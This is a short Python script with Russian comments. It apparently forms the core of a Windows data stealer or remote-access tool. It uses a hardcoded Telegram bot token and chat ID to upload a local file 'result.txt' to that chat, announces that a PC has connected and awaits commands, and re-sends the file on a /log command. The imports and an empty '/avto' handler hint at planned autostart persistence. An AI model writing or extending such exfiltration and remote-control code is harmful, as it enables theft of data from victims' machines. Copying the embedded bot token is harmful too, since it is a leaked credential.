import telebot
import os
import sys
import shutil
import winshell
import win32con
import pythoncom

# Замените на свой токен и ID чата
token = '6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U'
chat_id = 1882056354

bot = telebot.TeleBot(token)

# Функция для отправки файла
def send_file(file_path):
 with open(file_path, 'rb') as f:
  bot.send_document(chat_id=chat_id, document=f)

# Отправляем файл и сообщение
send_file('result.txt')
bot.send_message(chat_id=chat_id, text="ПОДЛЮЧЕН ПК\nОжидаю команды...")

# Обработчик команды /log
@bot.message_handler(commands=['log'])
def handle_log(message):
 send_file('result.txt')

# Обработчик команды /avto
# Запускаем бота
bot.polling(none_stop=True)
